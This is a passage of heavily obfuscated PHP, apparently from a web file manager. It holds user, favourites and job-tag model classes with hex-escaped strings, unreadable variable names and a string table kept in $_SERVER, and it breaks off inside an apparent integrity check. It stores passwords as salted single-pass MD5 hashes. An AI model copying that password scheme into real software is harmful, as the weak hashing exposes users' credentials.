”: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($‰ÆÚÖ×) { $¡ìŠúø =& $_SERVER[™»È’øè]; return array($¡ìŠúø[1981] => array(USER_ID, $¡ìŠúø[2319])); } protected function listData() { $ªÃ¸ÎÈÈ =& $_SERVER[™»È’øè]; $¬òª»º¸ = array($ªÃ¸ÎÈÈ[1669] => USER_ID, $ªÃ¸ÎÈÈ[524] => 0); $Ó«Ù½‘î = $ªÃ¸ÎÈÈ[2320]; $ˆÄšØé = $this->field($Ó«Ù½‘î)->where($¬òª»º¸)->order($ªÃ¸ÎÈÈ[2321])->select(); return $ˆÄšØé ? $ˆÄšØé : array(); } protected function resetCache() { } protected function listView() { $åÖÙµ£Ò =& $_SERVER[™»È’øè]; $Š–ÕÉéú = $this->listData(); $áğ‰Œ = array_filter_by_field($Š–ÕÉéú, $åÖÙµ£Ò[33], $åÖÙµ£Ò[457]); $”ø¸Ä™Á = array_to_keyvalue($áğ‰Œ, $åÖÙµ£Ò[12], $åÖÙµ£Ò[84]); if (!$”ø¸Ä™Á) { return $Š–ÕÉéú; } $’šÚÖ‘Ë = 2000; $£…Êæú  = array($åÖÙµ£Ò[458] => array($åÖÙµ£Ò[459], $”ø¸Ä™Á)); $óªß»Ìè = Model($åÖÙµ£Ò[850])->listSource($£…Êæú , $’šÚÖ‘Ë); $óªß»Ìè = array_merge($óªß»Ìè[$åÖÙµ£Ò[83]], $óªß»Ìè[$åÖÙµ£Ò[82]]); $óªß»Ìè = array_to_keyvalue($óªß»Ìè, $åÖÙµ£Ò[180]); foreach ($Š–ÕÉéú as $á´ñŞâ => $‘á•ı†Õ) { $‘ÌÂËŞï = $óªß»Ìè[$‘á•ı†Õ[$åÖÙµ£Ò[84]]]; $‘ÌÂËŞï = $‘ÌÂËŞï ? $‘ÌÂËŞï : array(); $Š–ÕÉéú[$á´ñŞâ] = array_merge($‘ÌÂËŞï, $‘á•ı†Õ); } return $Š–ÕÉéú; } protected function addFav($£ÇÜãÙş, $Õ­´Àˆı = '', $Âî¾õå÷ = "\x73\157\x75\x72\143\x65") { $»âª’Ìñ =& $_SERVER[™»È’øè]; $Ú”‘°¾ = array($»âª’Ìñ[1669] => USER_ID, $»âª’Ìñ[524] => 0, $»âª’Ìñ[463] => $Âî¾õå÷, $»âª’Ìñ[462] => $£ÇÜãÙş); if ($this->where($Ú”‘°¾)->find()) { return !1; } $Ú”‘°¾ = array($»âª’Ìñ[1669] => USER_ID, $»âª’Ìñ[524] => 0); $³ŒÍ—ìİ = $this->where($Ú”‘°¾)->max($»âª’Ìñ[1894]); if (!$³ŒÍ—ìİ) { $³ŒÍ—ìİ = 0; } if (!$Õ­´Àˆı && $Âî¾õå÷ == $»âª’Ìñ[457]) { $³ˆ‰ö‡Ñ = Model($»âª’Ìñ[1362])->where(array($»âª’Ìñ[458] => $£ÇÜãÙş))->find(); if (!$³ˆ‰ö‡Ñ) { return !1; } $Õ­´Àˆı = $³ˆ‰ö‡Ñ[$»âª’Ìñ[32]]; } $Õ­´Àˆı = $this->getAutoName($Õ­´Àˆı); $ø”ÀˆŞ = array($»âª’Ìñ[1669] => USER_ID, $»âª’Ìñ[524] => 0, $»âª’Ìñ[461] => $Õ­´Àˆı, $»âª’Ìñ[462] => $£ÇÜãÙş, $»âª’Ìñ[463] => $Âî¾õå÷, $»âª’Ìñ[1874] => $³ŒÍ—ìİ + 1); return $this->add($ø”ÀˆŞ); } protected function remove($øÛÛØÒó) { $›òíË°„ =& $_SERVER[™»È’øè]; $›¿éÆ¥ = array($›òíË°„[1669] => USER_ID, $›òíË°„[460] => $øÛÛØÒó); return $this->where($›¿éÆ¥)->delete(); } protected function removeByName($ìÎœà¦Ë) { $ò¨ĞàÃğ =& $_SERVER[™»È’øè]; $æÁ¯¶•• = array($ò¨ĞàÃğ[1669] => USER_ID, $ò¨ĞàÃğ[461] => $ìÎœà¦Ë, $ò¨ĞàÃğ[524] => 0); return $this->where($æÁ¯¶••)->delete(); } protected function rename($Œ××Şêê, $£™ˆë«è) { $Ë™©ò­Ø =& $_SERVER[™»È’øè]; if ($Œ××Şêê == $£™ˆë«è) { return !1; } $–ÙµíÚ = $this->getAutoName($£™ˆë«è); if ($£™ˆë«è != $–ÙµíÚ) { return !1; } $›Ğ³¼†Â = array($Ë™©ò­Ø[1669] => USER_ID, $Ë™©ò­Ø[524] => 0, $Ë™©ò­Ø[32] => $Œ××Şêê); return $this->where($›Ğ³¼†Â)->save(array($Ë™©ò­Ø[32] => $£™ˆë«è)); } protected function resetSort($Êê†¼ï) { $ñ»Ä“¶ =& $_SERVER[™»È’øè]; $Êê†¼ï = is_array($Êê†¼ï) ? $Êê†¼ï : array(); $€·É–…ƒ = array($ñ»Ä“¶[1669] => USER_ID); for ($´Ù€õ¢¿ = 0; $´Ù€õ¢¿ < count($Êê†¼ï); $´Ù€õ¢¿++) { $€·É–…ƒ[$ñ»Ä“¶[460]] = $Êê†¼ï[$´Ù€õ¢¿]; $this->where($€·É–…ƒ)->save(array($ñ»Ä“¶[1874] => $´Ù€õ¢¿ + 1)); } return !0; } protected function moveTop($Á¤Œ¤¿ñ) { $»€´¾şÙ =& $_SERVER[™»È’øè]; $ŒÚ„á‘ = array($»€´¾şÙ[1669] => USER_ID, $»€´¾şÙ[524] => 0); $ëÂÑŠ = $this->where($ŒÚ„á‘)->where(array($»€´¾şÙ[32] => $Á¤Œ¤¿ñ))->find(); if (!$ëÂÑŠ) { return; } $»®¬•¡Ã = $this->field($»€´¾şÙ[442])->where($ŒÚ„á‘)->order($»€´¾şÙ[2321])->select(); $»®¬•¡Ã = array_to_keyvalue($»®¬•¡Ã, $»€´¾şÙ[12], $»€´¾şÙ[442]); $Ÿ±¤†’ù = $»®¬•¡Ã; $»®¬•¡Ã = array_remove_value($»®¬•¡Ã, $ëÂÑŠ[$»€´¾şÙ[442]]); array_unshift($»®¬•¡Ã, $ëÂÑŠ[$»€´¾şÙ[442]]); return $this->resetSort($»®¬•¡Ã); } protected function moveBottom($‹êâòñÂ) { $ÂÙƒ‹ù¯ =& $_SERVER[™»È’øè]; $Øİ®Ò€³ = array($ÂÙƒ‹ù¯[1669] => USER_ID, $ÂÙƒ‹ù¯[524] => 0); $´ÓÜ°‰ß = $this->where($Øİ®Ò€³)->max($ÂÙƒ‹ù¯[1894]); $¨©šËÕ© = array($ÂÙƒ‹ù¯[1894] => $´ÓÜ°‰ß + 1); return $this->where($Øİ®Ò€³)->where(array($ÂÙƒ‹ù¯[32] => $‹êâòñÂ))->save($¨©šËÕ©); } private function getAutoName($ ‹ÜÊß‹) { $Ç»¶û¥Œ =& $_SERVER[™»È’øè]; $í¹ºâŠ´ = array($Ç»¶û¥Œ[1669] => USER_ID, $Ç»¶û¥Œ[524] => 0); $ğÙ³ê…ö = $this->field($Ç»¶û¥Œ[32])->where($í¹ºâŠ´)->select(); $ğÙ³ê…ö = array_to_keyvalue($ğÙ³ê…ö, $Ç»¶û¥Œ[12], $Ç»¶û¥Œ[32]); if (!$ğÙ³ê…ö || !in_array($ ‹ÜÊß‹, $ğÙ³ê…ö)) { return $ ‹ÜÊß‹; } for ($—÷›ªİÔ = 0; $—÷›ªİÔ < count($ğÙ³ê…ö); $—÷›ªİÔ++) { if (!in_array($ ‹ÜÊß‹ . "\x28{$—÷›ªİÔ}\51", $ğÙ³ê…ö)) { return $ ‹ÜÊß‹ . "\50{$—÷›ªİÔ}\51"; } } return $ ‹ÜÊß‹ . "\x28{$—÷›ªİÔ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\152\157\142\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x64\x65\163\143", "\163\x6f\162\164"); const JOB_KEY = "\x73\145\154\146\x4a\157\x62\x4c\151\163\164"; public function listData($ØÍÊÊ— = false, $Œ¡›§ç¸ = "\x73\x6f\162\x74", $˜Ùû¡½÷ = false) { return parent::listData($ØÍÊÊ—, $Œ¡›§ç¸, $˜Ùû¡½÷); } public function remove($›ìÙÏÈĞ) { return parent::remove($›ìÙÏÈĞ); } public function add($¡ô×Ë²‰) { $Ş¤ì’‰ò =& $_SERVER[™»È’øè]; if ($this->findByName($¡ô×Ë²‰[$Ş¤ì’‰ò[32]])) { return !1; } $¡ô×Ë²‰[$Ş¤ì’‰ò[1894]] = $this->getSort(); return parent::insert($¡ô×Ë²‰); } private function getSort() { $¯î“ƒ¼Ê =& $_SERVER[™»È’øè]; $»Õõı•’ = parent::listData(); $ÃıŞ«Œ = array_to_keyvalue($»Õõı•’, $¯î“ƒ¼Ê[12], $¯î“ƒ¼Ê[1894]); return empty($ÃıŞ«Œ) ? 0 : max($ÃıŞ«Œ) + 1; } public function update($Å¼åıå, $®‘Š¢—) { $íÑ£ØŠ– =& $_SERVER[™»È’øè]; $óıÜú¾ = parent::listData($Å¼åıå); $åù»Ş¤ = $this->findByName($®‘Š¢—[$íÑ£ØŠ–[32]]); if (!$óıÜú¾ || $åù»Ş¤ && $åù»Ş¤[$íÑ£ØŠ–[442]] != $óıÜú¾[$íÑ£ØŠ–[442]]) { return !1; } return parent::update($Å¼åıå, $®‘Š¢—); } public function setUserJob($Ü™öó¿, $Ğ®Á»ı¢) { $¶’Ûú±Ã =& $_SERVER[™»È’øè]; if (!is_array($Ğ®Á»ı¢)) { $Ğ®Á»ı¢ = array($Ğ®Á»ı¢); } $¡³ş‡šç = parent::listData(); $ĞóŒ™’À = array_to_keyvalue($¡³ş‡šç, $¶’Ûú±Ã[32]); $Û¸Ñ“Ç = $¶’Ûú±Ã[421]; foreach ($Ğ®Á»ı¢ as $æ¯Áèƒ) { if ($ĞóŒ™’À[$æ¯Áèƒ]) { $Û¸Ñ“Ç .= $ĞóŒ™’À[$æ¯Áèƒ][$¶’Ûú±Ã[442]] . $¶’Ûú±Ã[50]; } else { $­­Á³®‘ = $this->add($æ¯Áèƒ); $Û¸Ñ“Ç .= $­­Á³®‘ . $¶’Ûú±Ã[50]; } } $Û¸Ñ“Ç = rtrim($Û¸Ñ“Ç, $¶’Ûú±Ã[50]); Model($¶’Ûú±Ã[566])->metaSet($Ü™öó¿, self::JOB_KEY, $Û¸Ñ“Ç); } public function getUserJob($†¢Ğìßå) { $ù³´€½ = Model($_SERVER[™»È’øè][566])->metaGet($†¢Ğìßå); return $this->getUserJobInfo($ù³´€½[self::JOB_KEY]); } public function getUserJobInfo($¯Ä¾Ó) { $À…†¶àö =& $_SERVER[™»È’øè]; $—ÈÀ“·¤ = explode($À…†¶àö[50], $¯Ä¾Ó); $ ïØòÉî = parent::listData(); $ ïØòÉî = array_remove_key($ ïØòÉî, $À…†¶àö[214]); $Ã°åõ = array(); foreach ($—ÈÀ“·¤ as $®¶¦Éä«) { if (isset($ ïØòÉî[$®¶¦Éä«])) { $Ã°åõ[] = $ ïØòÉî[$®¶¦Éä«]; } } return $Ã°åõ; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\155\145" => "\165\163\145\162\x5f\155\145\164\141", "\155\145\x74\141\x46\151\145\154\144" => "\165\163\x65\x72\111\x44"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\x6e\x69\x63\x6b\116\141\155\145\x2c\156\141\x6d\x65\x2c\141\166\x61\164\x61\x72\x2c\163\x65\x78\54\x73\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($…–£‹Õ) { $İêˆŠæ÷ =& $_SERVER[™»È’øè]; $–ùóã»Á = $İêˆŠæ÷[2322]; return array($İêˆŠæ÷[1948] => array($…–£‹Õ[0], $–ùóã»Á), $İêˆŠæ÷[1950] => array($…–£‹Õ[0], $–ùóã»Á), $İêˆŠæ÷[2323] => array($…–£‹Õ[0], $–ùóã»Á)); } protected function getInfo($»Ÿ¶Ç¢, $ÇïŠ”‰ = false) { $ã¤¦ ‡ = $this->getInfoSimple($»Ÿ¶Ç¢); if (!is_array($ã¤¦ ‡)) { return array(); } if ($ÇïŠ”‰) { return $this->_getInfoApply($ã¤¦ ‡); } return $this->cacheFunctionGet($_SERVER[™»È’øè][1952], $»Ÿ¶Ç¢); } protected function getInfoFull($Í˜«ı, $†ñƒ­³ = false) { $êŒ¼ûöñ = $this->getInfoSimple($Í˜«ı); if (!is_array($êŒ¼ûöñ)) { return array(); } if ($†ñƒ­³) { return $this->_getInfoApply($êŒ¼ûöñ, !0); } return $this->cacheFunctionGet($_SERVER[™»È’øè][2324], $Í˜«ı); } private function _getInfoApply($şåûòß, $ÑÖá€ü = false) { $æšì˜Šõ =& $_SERVER[™»È’øè]; if (!$şåûòß) { return $şåûòß; } $‡Ê›øÑ¦ = md5($æšì˜Šõ[2325] . $şåûòß[$æšì˜Šõ[919]] . $æšì˜Šõ[2326] . $şåûòß[$æšì˜Šõ[32]]); $şåûòß = $this->_listDataApplyItem($şåûòß); $€¡ÅÕõî = Model($æšì˜Šõ[1362])->metaGet($şåûòß[$æšì˜Šõ[87]][$æšì˜Šõ[180]]); $şåûòß[$æšì˜Šõ[2327]] = $‡Ê›øÑ¦; $şåûòß[$æšì˜Šõ[87]][$æšì˜Šõ[2144]] = isset($€¡ÅÕõî[$æšì˜Šõ[2145]]) ? $€¡ÅÕõî[$æšì˜Šõ[2145]] : null; if ($ÑÖá€ü) { $şåûòß[$æšì˜Šõ[506]] = $this->metaGet($şåûòß[$æšì˜Šõ[1678]]); } return $şåûòß; } protected function getInfoSimple($µ»é÷×, $€Î¡›³ú = false) { $Öíø¤Û˜ =& $_SERVER[™»È’øè]; if (!$µ»é÷×) { return array(); } if ($€Î¡›³ú) { $í°Ìáã = $this->where(array($Öíø¤Û˜[1678] => intval($µ»é÷×)))->find(); if (!is_array($í°Ìáã)) { return array(); } $í°Ìáã[$Öíø¤Û˜[2328]] = Action($Öíø¤Û˜[2329])->parseUrl($í°Ìáã[$Öíø¤Û˜[2328]]); return $í°Ìáã; } return $this->cacheFunctionGet($Öíø¤Û˜[1953], $µ»é÷×); } protected function getInfoSimpleOuter($É¤¿íëÑ) { $¯ÁíÄĞû =& $_SERVER[™»È’øè]; if (!$É¤¿íëÑ || $É¤¿íëÑ == 0) { return array($¯ÁíÄĞû[1678] => $¯ÁíÄĞû[211], $¯ÁíÄĞû[32] => $¯ÁíÄĞû[162] . LNG($¯ÁíÄĞû[2330]) . $¯ÁíÄĞû[164], $¯ÁíÄĞû[2328] => STATIC_PATH . $¯ÁíÄĞû[2331]); } $ØÙŒ¦âá = $this->cacheFunctionGet($¯ÁíÄĞû[1953], $É¤¿íëÑ); $ÕÆ¦„Ì‘ = array_field_key($ØÙŒ¦âá, explode($¯ÁíÄĞû[50], $this->simpleField)); if (!$ÕÆ¦„Ì‘) { return array($¯ÁíÄĞû[1678] => $¯ÁíÄĞû[1218], $¯ÁíÄĞû[32] => $¯ÁíÄĞû[162] . LNG($¯ÁíÄĞû[2332]) . $¯ÁíÄĞû[164], $¯ÁíÄĞû[2328] => STATIC_PATH . $¯ÁíÄĞû[2333]); } $ÕÆ¦„Ì‘[$¯ÁíÄĞû[2328]] = Action($¯ÁíÄĞû[2329])->parseUrl($ÕÆ¦„Ì‘[$¯ÁíÄĞû[2328]]); return $ÕÆ¦„Ì‘; } protected function groupUser($Ô›™¢ëŠ) { } public static function errorLang($¼¯Ëâ©š) { $‰‚ü‘›à =& $_SERVER[™»È’øè]; $›€Á›´ = array(self::ERROR_USER_NOT_EXISTS => $‰‚ü‘›à[2334], self::ERROR_USER_PASSWORD_ERROR => $‰‚ü‘›à[2335], self::ERROR_USER_EXIST_NAME => $‰‚ü‘›à[2336], self::ERROR_USER_EXIST_PHONE => $‰‚ü‘›à[2337], self::ERROR_USER_EXIST_EMAIL => $‰‚ü‘›à[2338], self::ERROR_USER_LOGIN_LOCK => $‰‚ü‘›à[2339], self::ERROR_IP_NOT_ALLOW => $‰‚ü‘›à[2340], self::ERROR_USER_EXIST_NICKNAME => $‰‚ü‘›à[2341]); return LNG($›€Á›´[$¼¯Ëâ©š]); } public function getInfoByMeta($“¶¥Õıè, $çÕê¼Ïø) { $ÃÄè†÷â =& $_SERVER[™»È’øè]; $•¤¤ïÇ„ = Model($ÃÄè†÷â[2342])->where(array($ÃÄè†÷â[94] => $“¶¥Õıè, $ÃÄè†÷â[417] => $çÕê¼Ïø))->find(); if ($•¤¤ïÇ„) { return $this->getInfo($•¤¤ïÇ„[$ÃÄè†÷â[1678]]); } return !1; } public function userLoginCheck($½öĞù, $Úáå¢ƒ) { $Î¸±éà• =& $_SERVER[™»È’øè]; $ÄÔç›ùí = $this->userLoginFind($½öĞù); if (!$ÄÔç›ùí) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÄÔç›ùí[$Î¸±éà•[1678]], $Úáå¢ƒ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÄÔç›ùí[$Î¸±éà•[1678]]); } public function userLoginFind($Şí¦¶Æü) { $¢½íóÅ =& $_SERVER[™»È’øè]; $ŞÎı¾Æè = array($¢½íóÅ[32] => $Şí¦¶Æü, $¢½íóÅ[2152] => $Şí¦¶Æü, $¢½íóÅ[348] => $Şí¦¶Æü, $¢½íóÅ[2343] => $Şí¦¶Æü, $¢½íóÅ[1030] => $¢½íóÅ[1032]); if ($this->nickNameRpt()) { unset($ŞÎı¾Æè[$¢½íóÅ[2152]]); } return $this->where($ŞÎı¾Æè)->find(); } public function clearCache($¯¶—ã´¨) { $¬È”¤ÆÍ =& $_SERVER[™»È’øè]; $this->cacheFunctionClear($¬È”¤ÆÍ[1952], $¯¶—ã´¨); $this->cacheFunctionClear($¬È”¤ÆÍ[1953], $¯¶—ã´¨); $this->cacheFunctionClear($¬È”¤ÆÍ[2324], $¯¶—ã´¨); } public function userPasswordCheck($©×şµ‹½, $«ëÑüƒï) { $œ¦î´Èâ =& $_SERVER[™»È’øè]; $Ëë²’àö = $this->where(array($œ¦î´Èâ[1678] => intval($©×şµ‹½)))->find(); $›°Ü¥æÛ = $this->metaGet($©×şµ‹½); $Á„ßÔôÑ = isset($›°Ü¥æÛ[$œ¦î´Èâ[2344]]) ? $›°Ü¥æÛ[$œ¦î´Èâ[2344]] : $œ¦î´Èâ[12]; if (md5($Á„ßÔôÑ . trim($«ëÑüƒï)) !== $Ëë²’àö[$œ¦î´Èâ[919]]) { return !1; } return !0; } public function userAdd($ÈØµİ¹Â) { $®Ï£õ” =& $_SERVER[™»È’øè]; $½ñ¾• = array($®Ï£õ”[461] => $ÈØµİ¹Â[$®Ï£õ”[32]], $®Ï£õ”[2345] => $ÈØµİ¹Â[$®Ï£õ”[1551]], $®Ï£õ”[2346] => isset($ÈØµİ¹Â[$®Ï£õ”[348]]) ? $ÈØµİ¹Â[$®Ï£õ”[348]] : $®Ï£õ”[12], $®Ï£õ”[2347] => isset($ÈØµİ¹Â[$®Ï£õ”[2343]]) ? $ÈØµİ¹Â[$®Ï£õ”[2343]] : $®Ï£õ”[12], $®Ï£õ”[2348] => isset($ÈØµİ¹Â[$®Ï£õ”[2152]]) ? $ÈØµİ¹Â[$®Ï£õ”[2152]] : $ÈØµİ¹Â[$®Ï£õ”[32]], $®Ï£õ”[2349] => isset($ÈØµİ¹Â[$®Ï£õ”[2328]]) ? $ÈØµİ¹Â[$®Ï£õ”[2328]] : $®Ï£õ”[12], $®Ï£õ”[2350] => isset($ÈØµİ¹Â[$®Ï£õ”[2351]]) ? $ÈØµİ¹Â[$®Ï£õ”[2351]] : 1, $®Ï£õ”[2352] => $ÈØµİ¹Â[$®Ï£õ”[919]], $®Ï£õ”[1954] => isset($ÈØµİ¹Â[$®Ï£õ”[1857]]) ? $ÈØµİ¹Â[$®Ï£õ”[1857]] : 1024 * 1024 * 20, $®Ï£õ”[1955] => 0, $®Ï£õ”[2353] => 0, $®Ï£õ”[1999] => isset($ÈØµİ¹Â[$®Ï£õ”[775]]) ? $ÈØµİ¹Â[$®Ï£õ”[775]] : 1); if (!empty($ÈØµİ¹Â[$®Ï£õ”[1678]])) { $½ñ¾•[$®Ï£õ”[1678]] = $ÈØµİ¹Â[$®Ï£õ”[1678]]; } $ï•¼µÒ÷ = $this->_checkExist($ÈØµİ¹Â); if ($ï•¼µÒ÷ !== !0) { return $ï•¼µÒ÷; } if (!empty($½ñ¾•[$®Ï£õ”[2328]]) && strlen($½ñ¾•[$®Ï£õ”[2328]]) > 255) { $½ñ¾•[$®Ï£õ”[2328]] = $®Ï£õ”[12]; } $˜¬¶šÇâ = $this->add($½ñ¾•); $Şú‘ä”Å = array($®Ï£õ”[2352] => $½ñ¾•[$®Ï£õ”[919]], $®Ï£õ”[2348] => $½ñ¾•[$®Ï£õ”[2152]]); $this->userEdit($˜¬¶šÇâ, $Şú‘ä”Å); Model($®Ï£õ”[1362])->userRootAdd($˜¬¶šÇâ); return $˜¬¶šÇâ; } protected function userEditTest($‘•ñ‹‘î, $×¹õåßŸ) { return $this->call($_SERVER[™»È’øè][2354], $‘•ñ‹‘î, $×¹õåßŸ); } protected function userEdit($ı©¶’ÉÀ, $Ò¬É°Âô) { $ô‚®šû =& $_SERVER[™»È’øè]; $ù×š®ÖÖ = $this->getInfoSimple($ı©¶’ÉÀ); if (!$ù×š®ÖÖ) { return !1; } $£ûˆê§† = $this->_checkExist($Ò¬É°Âô, $ı©¶’ÉÀ); if ($£ûˆê§† !== !0) { return $£ûˆê§†; } if (isset($Ò¬É°Âô[$ô‚®šû[919]]) && trim($Ò¬É°Âô[$ô‚®šû[919]]) != $ô‚®šû[12]) { $Ïû¤Ø‰ó = $this->metaGet($ı©¶’ÉÀ); if (empty($Ïû¤Ø‰ó[$ô‚®šû[2344]])) { $Ïû¤Ø‰ó[$ô‚®šû[2344]] = rand_string(10); Model($ô‚®šû[545])->metaSet($ı©¶’ÉÀ, $ô‚®šû[2344], $Ïû¤Ø‰ó[$ô‚®šû[2344]]); } $Ò¬É°Âô[$ô‚®šû[919]] = md5($Ïû¤Ø‰ó[$ô‚®šû[2344]] . trim($Ò¬É°Âô[$ô‚®šû[919]])); } else { unset($Ò¬É°Âô[$ô‚®šû[919]]); } if (!empty($Ò¬É°Âô[$ô‚®šû[2328]]) && strlen($Ò¬É°Âô[$ô‚®šû[2328]]) > 255) { $Ò¬É°Âô[$ô‚®šû[2328]] = $ô‚®šû[12]; } $this->where(array($ô‚®šû[1669] => $ı©¶’ÉÀ))->save($Ò¬É°Âô); if (isset($Ò¬É°Âô[$ô‚®šû[2152]])) { $this->setNamePinyin($ı©¶’ÉÀ, $Ò¬É°Âô[$ô‚®šû[2152]]); } $this->clearCache($ı©¶’ÉÀ); return !0; } public function setNamePinyin($ÊæÛş», $Ü—óïô• = false) { $‰Ì¬‘ş =& $_SERVER[™»È’øè]; if (!$Ü—óïô•) { $û±”Ôª¦ = $this->getInfoSimple($ÊæÛş»); $Ü—óïô• = $û±”Ôª¦[$‰Ì¬‘ş[2152]] ? $û±”Ôª¦[$‰Ì¬‘ş[2152]] : $û±”Ôª¦[$‰Ì¬‘ş[32]]; } $¿ñœŒµÍ = Model($‰Ì¬‘ş[566]); if (!Input::check($Ü—óïô•, $‰Ì¬‘ş[622])) { return $¿ñœŒµÍ->metaSet($ÊæÛş», array($‰Ì¬‘ş[505] => $‰Ì¬‘ş[12], $‰Ì¬‘ş[504] => $‰Ì¬‘ş[12])); } return $¿ñœŒµÍ->metaSet($ÊæÛş», array($‰Ì¬‘ş[505] => str_replace($‰Ì¬‘ş[53], $‰Ì¬‘ş[12], Pinyin::get($Ü—óïô•)), $‰Ì¬‘ş[504] => Pinyin::get($Ü—óïô•, $‰Ì¬‘ş[623]))); } private function nickNameRpt() { $ù÷ÙŠ´ =& $_SERVER[™»È’øè]; $Ã‚ÔÍˆŒ = Model($ù÷ÙŠ´[795])->get($ù÷ÙŠ´[2355]); $û¶ú²Ú = $GLOBALS[$ù÷ÙŠ´[6]][$ù÷ÙŠ´[424]][$ù÷ÙŠ´[2355]]; $Ô¼¤¿ê® = !is_null($Ã‚ÔÍˆŒ) ? $Ã‚ÔÍˆŒ : $û¶ú²Ú; return !!$Ô¼¤¿ê®; } private function _checkExist($Ì»¡¾Œñ, $•‚İÌª– = false) { $œ¼åÀñ =& $_SERVER[™»È’øè]; $ÈĞä–Äé = array($œ¼åÀñ[32] => UserModel::ERROR_USER_EXIST_NAME, $œ¼åÀñ[2152] => UserModel::ERROR_USER_EXIST_NICKNAME, $œ¼åÀñ[348] => UserModel::ERROR_USER_EXIST_EMAIL, $œ¼åÀñ[2343] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÈĞä–Äé[$œ¼åÀñ[2152]]); } $ˆ¦€© = $•‚İÌª– ? array($œ¼åÀñ[1678] => array($œ¼åÀñ[2356], $•‚İÌª–)) : array(); foreach ($ÈĞä–Äé as $ê™ÑşÀ => $ÓÀ¾û) { $ÌİÁî²Œ = array(); foreach ($ÈĞä–Äé as $ëŠõ×ØÏ => $àŠ¸¬­½) { if (isset($Ì»¡¾Œñ[$ëŠõ×ØÏ]) && $Ì»¡¾Œñ[$ëŠõ×ØÏ]) { $ÌİÁî²Œ[] = $Ì»¡¾Œñ[$ëŠõ×ØÏ]; } } if (!$ÌİÁî²Œ) { continue; } $ÀÅ¶å¨É = array_merge(array($ê™ÑşÀ => array($œ¼åÀñ[7], $ÌİÁî²Œ)), $ˆ¦€©); $…¦ŸŒ—ü = $this->where($ÀÅ¶å¨É)->find(); if ($…¦ŸŒ—ü) { return $ÓÀ¾û; } } return !0; } public function userListInfo($úÉÉ×²Œ) { $µÜÁÁ‚Õ =& $_SERVER[™»È’øè]; $÷üõ†å¥ = array(); $úÉÉ×²Œ = is_array($úÉÉ×²Œ) ? array_unique($úÉÉ×²Œ) : array(); if (!$úÉÉ×²Œ) { return $÷üõ†å¥; } if (count($úÉÉ×²Œ) < 20) { foreach ($úÉÉ×²Œ as $úÔˆ›‰) { $÷üõ†å¥[$úÔˆ›‰ . $µÜÁÁ‚Õ[12]] = $this->getInfoSimpleOuter($úÔˆ›‰); } } else { $Ÿ…ñ‹É´ = array($µÜÁÁ‚Õ[1669] => array($µÜÁÁ‚Õ[459], $úÉÉ×²Œ)); if (count($úÉÉ×²Œ) == 1) { $Ÿ…ñ‹É´ = array($µÜÁÁ‚Õ[1669] => $úÉÉ×²Œ[0]); } $Û¹ŒÄŠú = Model($µÜÁÁ‚Õ[545])->field($this->simpleField)->where($Ÿ…ñ‹É´)->select(); $Û¹ŒÄŠú = array_to_keyvalue($Û¹ŒÄŠú, $µÜÁÁ‚Õ[1678]); foreach ($úÉÉ×²Œ as $úÔˆ›‰) { $Æë‡’‹Û = $Û¹ŒÄŠú[$úÔˆ›‰]; if (!$Æë‡’‹Û) { $÷üõ†å¥[$úÔˆ›‰ . $µÜÁÁ‚Õ[12]] = $this->getInfoSimpleOuter($úÔˆ›‰); continue; } $Æë‡’‹Û[$µÜÁÁ‚Õ[2328]] = Action($µÜÁÁ‚Õ[2329])->parseUrl($Æë‡’‹Û[$µÜÁÁ‚Õ[2328]]); $÷üõ†å¥[$úÔˆ›‰ . $µÜÁÁ‚Õ[12]] = $Æë‡’‹Û; } } return $÷üõ†å¥; } protected function userStatus($¬¦¦Ÿšò, $šĞ£”—Ú) { $ò‘æ–ìÈ = $this->getInfoSimple($¬¦¦Ÿšò); if (!$ò‘æ–ìÈ) { return !1; } $“àÑ«¶ = array($_SERVER[™»È’øè][775] => $šĞ£”—Ú); return $this->userEdit($¬¦¦Ÿšò, $“àÑ«¶); } protected function userRemove($Ë“£­¡) { $¬¥©ß¥ =& $_SERVER[™»È’øè]; $úĞ–ÎÇ® = $this->getInfoSimple($Ë“£­¡); if (!$úĞ–ÎÇ®) { return !1; } $˜¼¾ôÖ¼ = array($¬¥©ß¥[1669] => $Ë“£­¡); Model($¬¥©ß¥[631])->where($˜¼¾ôÖ¼)->delete(); Model($¬¥©ß¥[2357])->where($˜¼¾ôÖ¼)->delete(); Model($¬¥©ß¥[1960])->where($˜¼¾ôÖ¼)->delete(); Model($¬¥©ß¥[2342])->where($˜¼¾ôÖ¼)->delete(); Model($¬¥©ß¥[1098])->where($˜¼¾ôÖ¼)->delete(); Model($¬¥©ß¥[2169])->removeUserAll($Ë“£­¡); Model($¬¥©ß¥[850])->userRootRemove($Ë“£­¡); return $this->where($˜¼¾ôÖ¼)->delete(); } protected function userGroupSet($Å½üùË, $º¼ú¦‘ø, $ÚÍĞó¼Ù = array()) { $Ó³‹ÑÎ¶ =& $_SERVER[™»È’øè]; $¯²ûÂ±İ = $_SERVER[$Ó³‹ÑÎ¶[895]] . $Ó³‹ÑÎ¶[896]; $Ëî¯¥õ  = $Ó³‹ÑÎ¶[1535]; if ($_SERVER[$Ó³‹ÑÎ¶[892]] != $Ëî¯¥õ ($¯²ûÂ±İ)) { $ÀÂ¤äë = $Ó³‹ÑÎ¶[909]; $†È¡À‘ = $Ó³‹ÑÎ¶[894]; $´¨èÎİ = $_SERVER[$Ó³‹ÑÎ¶[895]] . $Ó³‹ÑÎ¶[896]; $¶ÛòœÂ = $†È¡À‘($´¨èÎİ); $‹‚£µ = explode($Ó³‹ÑÎ¶[245], $¶ÛòœÂ); if (count($‹‚£µ) < 